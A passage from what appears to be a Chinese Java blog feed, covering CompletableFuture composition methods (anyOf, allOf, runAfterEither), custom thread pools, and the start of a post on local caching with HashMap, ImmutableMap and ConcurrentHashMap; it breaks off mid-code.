class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">CompletableFuture&lt;Integer&gt; future1 = CompletableFuture.supplyAsync(<span class="keyword">new</span> Supplier&lt;Integer&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">get</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> number = <span class="keyword">new</span> Random().nextInt(<span class="number">5</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            TimeUnit.SECONDS.sleep(number);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"任务1结果："</span> + number);</span><br><span class="line">        <span class="keyword">return</span> number;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">CompletableFuture&lt;Integer&gt; future2 = CompletableFuture.supplyAsync(<span class="keyword">new</span> Supplier&lt;Integer&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">get</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> number = <span class="keyword">new</span> Random().nextInt(<span class="number">5</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            TimeUnit.SECONDS.sleep(number);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"任务2结果:"</span> + number);</span><br><span class="line">        <span class="keyword">return</span> number;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">future1.runAfterEither(future2, <span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"已经有一个任务完成了"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;).join();</span><br></pre></td></tr></table></figure><h4 id="anyOf"><a href="#anyOf" class="headerlink" title="anyOf"></a>anyOf</h4><p><code>anyOf()</code>的参数是多个给定的 <code>CompletableFuture</code>，当其中的任何一个完成时，方法返回这个 <code>CompletableFuture</code>。</p><p>常用方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> CompletableFuture&lt;Object&gt; <span class="title">anyOf</span><span class="params">(CompletableFuture&lt;?&gt;... cfs)</span></span></span><br></pre></td></tr></table></figure><p>具体使用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Random random = <span class="keyword">new</span> Random();</span><br><span class="line">CompletableFuture&lt;String&gt; future1 = CompletableFuture.supplyAsync(() -&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        TimeUnit.SECONDS.sleep(random.nextInt(<span class="number">5</span>));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"hello"</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">CompletableFuture&lt;String&gt; future2 = CompletableFuture.supplyAsync(() -&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        TimeUnit.SECONDS.sleep(random.nextInt(<span class="number">1</span>));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"world"</span>;</span><br><span class="line">&#125;);</span><br><span class="line">CompletableFuture&lt;Object&gt; result = CompletableFuture.anyOf(future1, future2);</span><br></pre></td></tr></table></figure><h4 id="allOf"><a href="#allOf" class="headerlink" title="allOf"></a>allOf</h4><p>allOf方法用来实现多 CompletableFuture 的同时返回。</p><p>常用方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> CompletableFuture&lt;Void&gt; <span class="title">allOf</span><span class="params">(CompletableFuture&lt;?&gt;... cfs)</span></span></span><br></pre></td></tr></table></figure><p>具体使用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">CompletableFuture&lt;String&gt; future1 = CompletableFuture.supplyAsync(() -&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        TimeUnit.SECONDS.sleep(<span class="number">2</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">"future1完成！"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"future1完成！"</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">CompletableFuture&lt;String&gt; future2 = CompletableFuture.supplyAsync(() -&gt; &#123;</span><br><span class="line">    System.out.println(<span class="string">"future2完成！"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"future2完成！"</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">CompletableFuture&lt;Void&gt; combindFuture = CompletableFuture.allOf(future1, future2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    combindFuture.get();</span><br><span class="line">&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">catch</span> (ExecutionException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="三、CompletableFuture常用方法总结"><a href="#三、CompletableFuture常用方法总结" class="headerlink" title="三、CompletableFuture常用方法总结:"></a>三、<strong>CompletableFuture常用方法总结</strong>:</h2><table>    <tr>        <td>分类</td>        <td>方法</td>        <td>说明</td>        <td>返回值</td>    </tr >    <tr >        <td>异步执行一个线程</td>        <td>CompletableFuture.runAsync(Runnable) <br>CompletableFuture.supplyAsync(Supplier)</td>        <td>默认使用ForkJoinPool.commonPool线程池<br>也可以指定Excutor参数指定线程池</td>        <td>runAsync返回CompletableFuture<Void>:无返回值<br>supplyAsync返回CompletableFuture<T>:有返回值<br>调用get()，join()返回阻塞等待线程结束</td>    </tr>    <tr>        <td rowspan="6">2个线程依次执行</td>        <td>thenApply</td>        <td>获取前一个线程的结果，转换。<br>thenApplySync:可指定线程池,其他方法类似</td>           <td>有返回值</td>    </tr>    <tr>        <td>thenAccept</td>        <td>获取前一个线程的结果，消费。</td>           <td>无返回值</td>    </tr>    <tr>        <td>thenRun</td>        <td>忽略前一个线程的结果，执行额外的逻辑。</td>           <td>无返回值</td>    </tr>    <tr>        <td>whenComplete</td>        <td>获取前一个线程的结果或异常，消费。</td>           <td>不影响上一线程返回值</td>    </tr>    <tr>        <td>exceptionally</td>        <td>前面线程异常时，执行，一般跟whenComplete配合使用。<br>捕获异常范围跟包括前面所有异步线程<br>如thenApply().thenAccept().exceptionally()</td>           <td>有返回值</td>    </tr>    <tr>        <td>handle</td>        <td>相当于whenComplete+exceptionally<br>根据是否产生异常内部if else分支处理业务逻辑</td>           <td>有返回值</td>    </tr>    <tr>        <td rowspan="3">等待2个线程都执行完</td>        <td>thenCombine</td>        <td>2个线程都要有返回值，等待都结束，结果合并转换</td>           <td>有返回值</td>    </tr>    <tr>        <td>thenAcceptBoth</td>        <td>2个线程都要有返回值，等待都结束，结果合并消费</td>           <td>无返回值</td>    </tr>    <tr>        <td>runAfterBoth</td>        <td>2个线程都无需要有返回值，等待都结束，执行其他逻辑</td>           <td>无返回值</td>    </tr>              <tr>        <td rowspan="3">等待2个线程任一执行完</td>        <td>applyToEither</td>        <td>2个线程都要有返回值，等待任一先结束，转换其结果</td>           <td>有返回值</td>    </tr>    <tr>        <td>acceptToEither</td>        <td>2个线程都要有返回值，等待任一先结束，消费其结果</td>           <td>无返回值</td>    </tr>          <tr>        <td>runAfterEither</td>        <td>2个线程无需要有返回值，等待任一先结束，执行其他逻辑</td>           <td>无返回值</td>    </tr>    <tr>        <td rowspan="2">多个线程等待</td>        <td>CompletableFuture.anyOf(cf1,cf2,cf3).join()</td>        <td>多个线程任一执行完即返回</td>           <td>有返回值Object</td>    </tr>    <tr>        <td>CompletableFuture.allOf(cf1,cf2,cf3).join()</td>        <td>多个线程全部执行完返回</td>           <td>无返回值</td>    </tr>            </table><h2 id="四、CompletableFuture替代CountDownLatch"><a href="#四、CompletableFuture替代CountDownLatch" class="headerlink" title="四、CompletableFuture替代CountDownLatch"></a>四、CompletableFuture替代CountDownLatch</h2><p>前文中记录了用CountDownLatch等待所有线程执行完毕，打印总耗时,现在用CompletableFuture代替(DemoExecutorService为自定义线程池)</p><h3 id="CountDownLatch"><a href="#CountDownLatch" class="headerlink" title="CountDownLatch"></a>CountDownLatch</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Resource</span>(name = <span class="string">"DemoExecutorService"</span>)</span><br><span class="line"><span class="keyword">private</span> ExecutorService DemoExecutorService;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Transactional</span>(rollbackFor = Exception<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">void</span> <span class="title">batchAjqs</span>(<span class="title">List</span>&lt;<span class="title">String</span>&gt; <span class="title">ids</span>) </span>&#123;</span><br><span class="line">    CopyOnWriteArrayList&lt;TestVo&gt; vos = Lists.newCopyOnWriteArrayList();</span><br><span class="line">    CountDownLatch countDownLatch = <span class="keyword">new</span> CountDownLatch(ids.size());</span><br><span class="line">    <span class="keyword">long</span> start = System.currentTimeMillis();</span><br><span class="line">    ids.forEach(id -&gt; DemoExecutorService.execute(() -&gt; &#123;</span><br><span class="line">        List&lt;TestVO&gt; res = DataBaseApi.selectByPrimaryKey(id);</span><br><span class="line">        vos.addAll(res);</span><br><span class="line">        countDownLatch.countDown();</span><br><span class="line">    &#125;));</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        countDownLatch.await();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        log.warn(<span class="string">"发生中断异常"</span>, e);</span><br><span class="line">        Thread.currentThread().interrupt();</span><br><span class="line">    &#125;</span><br><span class="line">    log.info(<span class="string">"批量处理&#123;&#125;个线程共花费&#123;&#125; ms"</span>, ids.size(), (System.currentTimeMillis() - start));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CompletableFuture"><a href="#CompletableFuture" class="headerlink" title="CompletableFuture"></a>CompletableFuture</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Transactional</span>(rollbackFor = Exception<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">void</span> <span class="title">batchAjqs</span>(<span class="title">List</span>&lt;<span class="title">String</span>&gt; <span class="title">ids</span>) </span>&#123;</span><br><span class="line">    CopyOnWriteArrayList&lt;TestVo&gt; vos = Lists.newCopyOnWriteArrayList();</span><br><span class="line">    <span class="keyword">long</span> start = System.currentTimeMillis();</span><br><span class="line">    CompletableFuture.allOf(</span><br><span class="line">        ids.stream().filter(StringUtils::isNotBlank)</span><br><span class="line">        .map(id -&gt; CompletableFuture.supplyAsync(() -&gt; DataBaseApi.selectByPrimaryKey(id),DemoExecutorService)</span><br><span class="line">        .exceptionally(e -&gt; &#123;</span><br><span class="line">            log.error(PLDY_CWTX, url);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;).whenComplete((s, e) -&gt; vos.addAll(s))</span><br><span class="line">    ).toArray(CompletableFuture[]::<span class="keyword">new</span>)</span><br><span class="line">).join();        </span><br><span class="line">    log.info(<span class="string">"批量处理&#123;&#125;个线程共花费&#123;&#125; ms"</span>, ids.size(), (System.currentTimeMillis() - start));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="附：自定义线程池的几种创建方法："><a href="#附：自定义线程池的几种创建方法：" class="headerlink" title="附：自定义线程池的几种创建方法："></a>附：自定义线程池的几种创建方法：</h2><h3 id="配置类-Configuration"><a href="#配置类-Configuration" class="headerlink" title="配置类 @Configuration"></a>配置类 @Configuration</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@Slf</span>4j</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadPoolConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value</span>(<span class="string">"$&#123;threadPool.multiple:10&#125;"</span>)</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> multiple;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> AtomicInteger ATOMIC_INTEGER = <span class="keyword">new</span> AtomicInteger(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> AtomicInteger YBSC_INTEGER = <span class="keyword">new</span> AtomicInteger(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> AtomicInteger SCHEDULE_INTEGER = <span class="keyword">new</span> AtomicInteger(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> KEEPALLIVETIME = <span class="number">60</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> QUEUE_CAPACITY = <span class="number">1000</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> CONVERT_CORESIZE = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> CONVERT_MAXNUMBER = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ofd转换pdf的异步线程池配置</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> ExecutorService</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span>(<span class="string">"convertTaskExecutor"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ExecutorService <span class="title">convertTaskExecutor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> TtlExecutors.getTtlExecutorService(<span class="keyword">new</span> ThreadPoolExecutor(</span><br><span class="line">                CONVERT_CORESIZE,</span><br><span class="line">                CONVERT_MAXNUMBER,</span><br><span class="line">                KEEPALLIVETIME,</span><br><span class="line">                TimeUnit.SECONDS,</span><br><span class="line">                <span class="keyword">new</span> ArrayBlockingQueue&lt;&gt;(QUEUE_CAPACITY),</span><br><span class="line">                r -&gt; <span class="keyword">new</span> Thread(r, <span class="string">"Thread-convert-"</span> + SCHEDULE_INTEGER.getAndIncrement()),</span><br><span class="line">                <span class="keyword">new</span> MainRejectedExecutionHandler()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">//1.</span></span><br><span class="line"><span class="meta">@Resource</span>(name = <span class="string">"convertTaskExecutor"</span>)</span><br><span class="line">   <span class="keyword">private</span> ExecutorService convertTaskExecutor;</span><br><span class="line"></span><br><span class="line">   Future&lt;InputStream&gt; submit = convertTaskExecutor.submit(() -&gt;      getOfd2pdfInputstream(ofdWslj));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.</span></span><br><span class="line">   <span class="meta">@Async</span>(<span class="string">"convertTaskExecutor"</span>)</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ofd2pdf</span><span class="params">(String url, String param1, Param param2)</span> </span>&#123;</span><br><span class="line">       </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="成员变量自定义"><a href="#成员变量自定义" class="headerlink" title="成员变量自定义"></a>成员变量自定义</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 自定义线程池</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadPoolExecutor EXECUTOR = <span class="keyword">new</span> ThreadPoolExecutor(<span class="number">5</span>, <span class="number">10</span>, <span class="number">5</span>, TimeUnit.SECONDS,</span><br><span class="line">        <span class="keyword">new</span> ArrayBlockingQueue&lt;&gt;(<span class="number">200</span>), UimThreadFactory.create(ZxWsMergeService<span class="class">.<span class="keyword">class</span>.<span class="title">getSimpleName</span>(), <span class="title">false</span>),</span></span><br><span class="line"><span class="class">        <span class="title">new</span> <span class="title">ThreadPoolExecutor</span>.<span class="title">CallerRunsPolicy</span>())</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CompletableFuture </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaweb项目常用缓存</title>
      <link href="/2022/08/21/javaweb%E9%A1%B9%E7%9B%AE%E5%B8%B8%E7%94%A8%E7%BC%93%E5%AD%98/"/>
      <url>/2022/08/21/javaweb%E9%A1%B9%E7%9B%AE%E5%B8%B8%E7%94%A8%E7%BC%93%E5%AD%98/</url>
      
        <content type="html"><![CDATA[<h2 id="缓存简介"><a href="#缓存简介" class="headerlink" title="缓存简介"></a>缓存简介</h2><p>随着互联网的普及，内容信息越来越复杂，用户数和访问量越来越大，我们的应用需要支撑更多的并发量，同时我们的应用服务器和数据库服务器所做的计算也越来越多。但是往往我们的应用服务器资源是有限的，且技术变革是缓慢的，数据库每秒能接受的请求次数也是有限的（或者文件的读写也是有限的），如何能够有效利用有限的资源来提供尽可能大的吞吐量? 一个有效的办法就是引入缓存，打破标准流程，每个环节中请求可以从缓存中直接获取目标数据并返回，从而减少计算量，有效提升响应速度，让有限的资源服务更多的用户。</p><h2 id="缓存的应用和实现"><a href="#缓存的应用和实现" class="headerlink" title="缓存的应用和实现"></a>缓存的应用和实现</h2><p>缓存有各类特征，而且有不同介质的区别，那么实际工程中我们怎么去对缓存分类呢? 在目前的应用服务框架中，比较常见的是根据缓存与应用的藕合度，分为local cache（本地缓存）和remote cache（分布式缓存）：</p><ul><li><strong>本地缓存</strong>：指的是在应用中的缓存组件，其最大的优点是应用和cache是在同一个进程内部，请求缓存非常快速，没有过多的网络开销等，在单应用不需要集群支持或者集群情况下各节点无需互相通知的场景下使用本地缓存较合适；同时，它的缺点也是应为缓存跟应用程序耦合，多个应用程序无法直接的共享缓存，各应用或集群的各节点都需要维护自己的单独缓存，对内存是一种浪费。</li><li><strong>分布式缓存</strong>：指的是与应用分离的缓存组件或服务，其最大的优点是自身就是一个独立的应用，与本地应用隔离，多个应用可直接的共享缓存。</li></ul><p>目前各种类型的缓存都活跃在成千上万的应用服务中，还没有一种缓存方案可以解决一切的业务场景或数据类型，我们需要根据自身的特殊场景和背景，选择最适合的缓存方案。缓存的使用是程序员、架构师的必备技能，好的程序员能根据数据类型、业务场景来准确判断使用何种类型的缓存，如何使用这种缓存，以最小的成本最快的效率达到最优的目的。</p><h3 id="缓存实现-本地缓存"><a href="#缓存实现-本地缓存" class="headerlink" title="缓存实现-本地缓存"></a>缓存实现-本地缓存</h3><p>编程直接实现缓存 个别场景下，我们只需要简单的缓存数据的功能，而无需关注更多存取、清空策略等深入的特性时，直接编程实现缓存则是最便捷和高效的。</p><h4 id="1-成员变量或局部变量实现"><a href="#1-成员变量或局部变量实现" class="headerlink" title="1. 成员变量或局部变量实现"></a>1. 成员变量或局部变量实现</h4><p>以局部变量map结构缓存部分业务数据，减少频繁的重复数据库I/O操作。缺点仅限于类的自身作用域内，类间无法共享缓存。</p><p>示例代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> calss DbService &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> DbMapper dbMapper;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, String&gt; cache = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">getDbVO</span><span class="params">(String id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(cache.containsKey(id)) &#123;</span><br><span class="line">            <span class="keyword">return</span> cache.get(id);</span><br><span class="line">        &#125;</span><br><span class="line">        String name = dbMapper.getNameById(id);</span><br><span class="line">        cache.put(id, name);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用ImmutableMap避免map被修改</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CacheLoadHelper</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * DbMapper</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> DbMapper dbMapper;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 避免修改map</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, List&lt;Entity&gt;&gt; dataCache = <span class="keyword">new</span> ImmutableMap.Builder&lt;String, List&lt;Entity&gt;&gt;().build();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 更新全部缓存</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reloadCache</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        dataCache = ImmutableMap.copyOf(<span class="keyword">this</span>.selectAll());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取缓存的数据</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Entity&gt; <span class="title">getCacheByType</span><span class="params">(String type)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// lazy init</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.dataCache.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">this</span>.dataCache = ImmutableMap.copyOf(<span class="keyword">this</span>.selectAllGroupByType());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 避免对源数据修改</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ArrayList&lt;&gt;(<span class="keyword">this</span>.dataCache.getOrDefault(type, <span class="keyword">new</span> ArrayList&lt;&gt;()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-静态变量实现"><a href="#2-静态变量实现" class="headerlink" title="2.静态变量实现"></a>2.静态变量实现</h4><p>最常用的单例实现静态资源缓存，代码示例如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SzfIDCache</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 缓存ConcurrentHashMap</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ConcurrentHashMap&lt;String, String&gt; CACHE_MAP = <span 